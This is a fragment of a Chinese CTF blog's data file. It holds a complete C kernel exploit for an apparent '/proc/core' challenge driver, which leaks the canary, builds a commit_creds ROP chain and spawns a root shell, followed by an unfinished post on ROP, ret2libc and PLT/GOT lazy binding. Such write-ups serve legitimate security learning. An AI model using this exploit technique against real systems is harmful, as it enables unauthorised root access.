class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveStatus</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">get_address</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">coreRead</span><span class=\"params\">(<span class=\"type\">char</span>* buf)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">coreCopyFunc</span><span class=\"params\">(<span class=\"type\">size_t</span> length)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">edit_off</span><span class=\"params\">(<span class=\"type\">size_t</span> num)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">shell</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">print_binary</span><span class=\"params\">(<span class=\"type\">char</span>* buf, <span class=\"type\">int</span> length)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// gadget </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">size_t</span> pop_rdi_ret=<span class=\"number\">0xffffffff81000b2f</span>; </span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">size_t</span> pop_rdx_ret=<span class=\"number\">0xffffffff810a0f49</span>; </span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">size_t</span> pop_rcx_ret=<span class=\"number\">0xffffffff81021e53</span>; </span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">size_t</span> swapgs_popfq_ret=<span class=\"number\">0xffffffff81a012da</span>; </span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">size_t</span> iretq_ret=<span class=\"number\">0xffffffff81050ac2</span>; </span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">size_t</span> mov_rdi_rax_call_rdx=<span class=\"number\">0xffffffff8101aa6a</span>; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> fd=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">size_t</span> commit_creds=<span class=\"number\">0</span>, prepare_kernel_cred=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">size_t</span> raw_vmlinux_base=<span class=\"number\">0xffffffff81000000</span>;</span><br><span class=\"line\"><span class=\"type\">size_t</span> vmlinux_base=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">size_t</span> vmoffset=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveStatus</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm__(<span class=\"string\">&quot;mov user_cs, cs;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;mov user_ss, ss;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;mov user_sp, rsp;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;pop user_rflags;&quot;</span></span><br><span class=\"line\">            );</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\033[34m\\033[1m[*] Status has been saved.\\033[0m&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// get address from /tmp/kallsym</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">get_address</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    FILE* symbols_table=fopen(<span class=\"string\">&quot;/tmp/kallsyms&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(symbols_table==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[31m\\033[1m[x] Error: Cannot open file \\&quot;/tmp/kallsyms\\&quot;\\n\\033[0m&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     </span><br><span class=\"line\">    <span class=\"type\">size_t</span> addr = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">char</span> type[<span class=\"number\">0x10</span>];</span><br><span class=\"line\">\t<span class=\"type\">char</span> func_name[<span class=\"number\">0x50</span>];</span><br><span class=\"line\">\t<span class=\"comment\">// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"built_in\">fscanf</span>(symbols_table, <span class=\"string\">&quot;%llx%s%s&quot;</span>, &amp;addr, type, func_name))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)\t\t<span class=\"comment\">// two addresses of key functions are all found, return directly.</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">        <span class=\"comment\">// function &quot;commit_creds&quot; found</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!<span class=\"built_in\">strcmp</span>(func_name, <span class=\"string\">&quot;commit_creds&quot;</span>))</span><br><span class=\"line\">        &#123;\t\t</span><br><span class=\"line\">\t\t\tcommit_creds = addr;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[32m\\033[1m[+] Note: Address of function \\&quot;commit_creds\\&quot; found: \\033[0m%#llx\\n&quot;</span>, commit_creds);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">        <span class=\"comment\">// function &quot;prepare_kernel_cred&quot; found</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"built_in\">strcmp</span>(func_name, <span class=\"string\">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class=\"line\">        &#123;\t</span><br><span class=\"line\">\t\t\tprepare_kernel_cred = addr;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[32m\\033[1m[+] Note: Address of function \\&quot;prepare_kernel_cred\\&quot; found: \\033[0m%#llx\\n&quot;</span>, prepare_kernel_cred);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">coreRead</span><span class=\"params\">(<span class=\"type\">char</span>* buf)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ioctl(fd,<span class=\"number\">0x6677889B</span>,buf);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">coreCopyFunc</span><span class=\"params\">(<span class=\"type\">size_t</span> length)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ioctl(fd,<span class=\"number\">0x6677889A</span>,length);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">edit_off</span><span class=\"params\">(<span class=\"type\">size_t</span> num)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ioctl(fd,<span class=\"number\">0x6677889C</span>,num);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">shell</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(getuid())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// this is a universal function to print binary data from a char* array</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">print_binary</span><span class=\"params\">(<span class=\"type\">char</span>* buf, <span class=\"type\">int</span> length)</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">char</span> output_buffer[<span class=\"number\">80</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(output_buffer, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">80</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(output_buffer, <span class=\"string\">&#x27; &#x27;</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;(length % <span class=\"number\">16</span> == <span class=\"number\">0</span> ? length / <span class=\"number\">16</span> : length / <span class=\"number\">16</span> + <span class=\"number\">1</span>); i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">char</span> temp_buffer[<span class=\"number\">0x10</span>];</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(temp_buffer, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">sprintf</span>(temp_buffer, <span class=\"string\">&quot;%#5x&quot;</span>, index);</span><br><span class=\"line\">\t\t<span class=\"built_in\">strcpy</span>(output_buffer, temp_buffer);</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">5</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;|&#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">7</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=<span class=\"number\">0</span>; j&lt;<span class=\"number\">16</span>; j++)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(index+j &gt;= length)</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">sprintf</span>(output_buffer+<span class=\"number\">8</span>+<span class=\"number\">3</span>*j, <span class=\"string\">&quot;   &quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">sprintf</span>(output_buffer+<span class=\"number\">8</span>+<span class=\"number\">3</span>*j, <span class=\"string\">&quot;%02x &quot;</span>, ((<span class=\"type\">int</span>)buf[index+j]) &amp; <span class=\"number\">0xFF</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(!<span class=\"built_in\">isprint</span>(buf[index+j]))</span><br><span class=\"line\">\t\t\t\t\toutput_buffer[<span class=\"number\">58</span>+j] = <span class=\"string\">&#x27;.&#x27;</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t\t\toutput_buffer[<span class=\"number\">58</span>+j] = buf[index+j];</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">55</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">56</span>] = <span class=\"string\">&#x27;|&#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">57</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, output_buffer);</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(output_buffer+<span class=\"number\">58</span>, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t\tindex += <span class=\"number\">16</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[34m\\033[1m[*] Start to exploit...\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    saveStatus();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// open core</span></span><br><span class=\"line\">    fd=open(<span class=\"string\">&quot;/proc/core&quot;</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(fd==<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[31m\\033[1m[x] Error: Cannot open process \\&quot;core\\&quot;\\n\\033[0m&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// get commit_creds and prepare_kernel_cred </span></span><br><span class=\"line\">    get_address();</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x50</span>]=&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"comment\">// cal real vm base</span></span><br><span class=\"line\">    vmlinux_base=commit_creds<span class=\"number\">-0x9c8e0</span>;</span><br><span class=\"line\">    vmoffset=vmlinux_base-raw_vmlinux_base;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[34m\\033[1m[*] This is real vmlinux base :\\033[0m%llx\\n&quot;</span>,vmlinux_base);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// leak canary</span></span><br><span class=\"line\">    edit_off(<span class=\"number\">64</span>);</span><br><span class=\"line\">    coreRead(buf);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">size_t</span> canary=((<span class=\"type\">size_t</span>*)buf)[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[35m\\033[1m[*] The value of canary is the first 8 bytes: \\033[0m%#llx\\n&quot;</span>, canary);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// make rop chain</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> rop_chain[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">// padding and canary</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(; i&lt;<span class=\"number\">10</span>; i++)</span><br><span class=\"line\">\t\trop_chain[i] = canary;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// commit_creds(prepare_kernel_cred(0)); </span></span><br><span class=\"line\">    <span class=\"comment\">// rdi=0</span></span><br><span class=\"line\">    rop_chain[i++]=pop_rdi_ret+vmoffset;</span><br><span class=\"line\">    rop_chain[i++]=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">// prepare_kernel_cred(0);</span></span><br><span class=\"line\">    rop_chain[i++]=prepare_kernel_cred;</span><br><span class=\"line\">    <span class=\"comment\">// rdi=rax; call rdx --&gt; pop rcx(move the next code of mov) --&gt; commit_creds(prepare_kernel_cred(0));</span></span><br><span class=\"line\">    rop_chain[i++]=pop_rdx_ret+vmoffset;</span><br><span class=\"line\">    rop_chain[i++]=pop_rcx_ret+vmoffset;</span><br><span class=\"line\">    rop_chain[i++]=mov_rdi_rax_call_rdx+vmoffset;</span><br><span class=\"line\">    rop_chain[i++]=commit_creds;</span><br><span class=\"line\">    <span class=\"comment\">// ret2usr swags; iretq</span></span><br><span class=\"line\">    rop_chain[i++]=swapgs_popfq_ret+vmoffset;</span><br><span class=\"line\">    rop_chain[i++]=<span class=\"number\">0</span>;   <span class=\"comment\">// popfq</span></span><br><span class=\"line\">    rop_chain[i++]=iretq_ret+vmoffset;</span><br><span class=\"line\">    <span class=\"comment\">// after the iretq: return address, user cs, user rflags, user sp, user ss</span></span><br><span class=\"line\">    rop_chain[i++]=(<span class=\"type\">size_t</span>)shell;</span><br><span class=\"line\">    rop_chain[i++]=user_cs;</span><br><span class=\"line\">    rop_chain[i++]=user_rflags;</span><br><span class=\"line\">    rop_chain[i++]=user_sp;</span><br><span class=\"line\">    rop_chain[i++]=user_ss;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[34m\\033[1m[*] Our rop chain looks like: \\033[0m\\n&quot;</span>);</span><br><span class=\"line\">\tprint_binary((<span class=\"type\">char</span>*)rop_chain, <span class=\"number\">0x100</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\twrite(fd, (<span class=\"type\">char</span>*)rop_chain, <span class=\"number\">0x800</span>);</span><br><span class=\"line\">    <span class=\"comment\">// use negative number overflow</span></span><br><span class=\"line\">\tcoreCopyFunc(<span class=\"number\">0xffffffffffff0100</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"ROP","date":"2023-01-01T16:00:20.000Z","_content":"ROP是面向返回的编程，通过一个个gadget来进行编程，**改变寄存器以及变量的值**，每一个gadget在执行了其指令后会通过**ret**返回到下一个gadget，从而达到控制程序执行流的目的。\n<!--more-->\n## ret2libc\n\n当有NX保护，无法执行shellcode，也无syscall和后门函数的话，通过ret2libc也可以达成get shell的目的。\n\n绝大部分程序运行前都会链接到**libc库**，并调用库中的函数实现功能，比如write、read、puts、system等函数就是这个库中的函数。ret2libc主要是利用libc中的函数达到get shell的目的，虽然程序中没有利用到system函数和\"/bin/sh\"，但在程序的libc中，这些内容都是**存在**的，只要能找到他们的地址，并能控制程序的执行流执行他们，就可以达到get shell的目的。\n\nsystem和\"/bin/sh\"的地址可以通过在程序中出现的libc库函数的地址得到。在一个版本的libc中，各个函数的位置是固定的，也就是说，**函数和libc基地址之间的偏移是固定的**，因此，通过pwntools的ELF模块解析了libc之后，就可以得到各个函数的偏移，通过已知函数的地址，就能知道system函数和\"/bin/sh\"的地址。\n\n### 延迟绑定机制(lazy binding)\n\n为了减少程序编译花费的时间，会采用**动态链接**的技术，在编译过程中，用**偏移**去表示函数的位置，**在程序运行时才将该函数的真实地址得出写入**，其中的延迟绑定机制是在**函数第一次运行时才将该函数的真实地址得出写入**。\n\n为了实现延迟绑定，编译时需要用到PLT和GOT进行辅助。GOT是全局偏移表，包括了.got表和.got.plt表，**.got表记录全局变量的地址，.got.plt表记录全局函数的地址**，PLT是进程链接表，.plt记录了**函数在GOT表中的位置和调用解析函数的代码**，保存在代码段中，在进程加载和运行的时候都不会改变。\n\n在程序中，call调用的是实际上是函数在.plt表中的内容。\n\n```\ncall xxx@plt\nxxx@plt指向xxx函数在.plt表中的内容\n\nxxx@plt:\njump *(xxx@got) //跳转到xxx函数在.got.plt表中的内容\npush index      //将一个数index入栈\njump got[0]     //跳转到.got表的第一项，也就是符号解析函数处\n```\n\n最开始时，xxx函数在 **.got.plt表中的内容** 是 **xxx@plt+6，也就是push index的地址**，并跳转到符号解析函数处进行解析，将xxx函数的**真实地址**（在.got表中的内容）**写入**xxx函数在.got.plt表中的位置，从第二次开始就可以直接跳转到真实的地址**直接执行**。\n\n下图可以看出plt和got表的关系\n\n![plt_and_got](./ROP/plt_and_got.jpg)\n\n\n\n### 对抗ASLR/PIE\n\n在开启了ASLR和PIE之后，程序基地址和libc基地址都会**随机化**，因此对libc的泄露就不再显然。需要利用程序中的输出函数（如：write、puts）将程序中.plt表中\n\n## csu\n\n## BROP\n\n## SROP\n","source":"_posts/ROP.md","raw":"---\ntitle: ROP\ndate: 2023-01-02 00:00:20\ncategories: \n- pwn\ntags: \n- pwn\n- stackoverflow\n- rop\n---\nROP是面向返回的编程，通过一个个gadget来进行编程，**改变寄存器以及变量的值**，每一个gadget在执行了其指令后会通过**ret**返回到下一个gadget，从而达到控制程序执行流的目的。\n<!--more-->\n## ret2libc\n\n当有NX保护，无法执行shellcode，也无syscall和后门函数的话，通过ret2libc也可以达成get shell的目的。\n\n绝大部分程序运行前都会链接到**libc库**，并调用库中的函数实现功能，比如write、read、puts、system等函数就是这个库中的函数。ret2libc主要是利用libc中的函数达到get shell的目的，虽然程序中没有利用到system函数和\"/bin/sh\"，但在程序的libc中，这些内容都是**存在**的，只要能找到他们的地址，并能控制程序的执行流执行他们，就可以达到get shell的目的。\n\nsystem和\"/bin/sh\"的地址可以通过在程序中出现的libc库函数的地址得到。在一个版本的libc中，各个函数的位置是固定的，也就是说，**函数和libc基地址之间的偏移是固定的**，因此，通过pwntools的ELF模块解析了libc之后，就可以得到各个函数的偏移，通过已知函数的地址，就能知道system函数和\"/bin/sh\"的地址。\n\n### 延迟绑定机制(lazy binding)\n\n为了减少程序编译花费的时间，会采用**动态链接**的技术，在编译过程中，用**偏移**去表示函数的位置，**在程序运行时才将该函数的真实地址得出写入**，其中的延迟绑定机制是在**函数第一次运行时才将该函数的真实地址得出写入**。\n\n为了实现延迟绑定，编译时需要用到PLT和GOT进行辅助。GOT是全局偏移表，包括了.got表和.got.plt表，**.got表记录全局变量的地址，.got.plt表记录全局函数的地址**，PLT是进程链接表，.plt记录了**函数在GOT表中的位置和调用解析函数的代码**，保存在代码段中，在进程加载和运行的时候都不会改变。\n\n在程序中，call调用的是实际上是函数在.plt表中的内容。\n\n```\ncall xxx@plt\nxxx@plt指向xxx函数在.plt表中的内容\n\nxxx@plt:\njump *(xxx@got) //跳转到xxx函数在.got.plt表中的内容\npush index      //将一个数index入栈\njump got[0]     //跳转到.got表的第一项，也就是符号解析函数处\n```\n\n最开始时，xxx函数在 **.got.plt表中的内容** 是 **xxx@plt+6，也就是push index的地址**，并跳转到符号解析函数处进行解析，将xxx函数的**真实地址**（在.got表中的内容）**写入**xxx函数在.got.plt表中的位置，从第二次开始就可以直接跳转到真实的地址**直接执行**。\n\n下图可以看出plt和got表的关系\n\n![plt_and_got](./ROP/plt_and_got.jpg)\n\n\n\n### 对抗ASLR/PIE\n\n在开启了ASLR和PIE之后，程序基地址和libc基地址都会**随机化**，因此对libc的泄露就不再显然。需要利用程序中的输出函数（如：write、puts）将程序中.plt表中\n\n## csu\n\n## BROP\n\n## 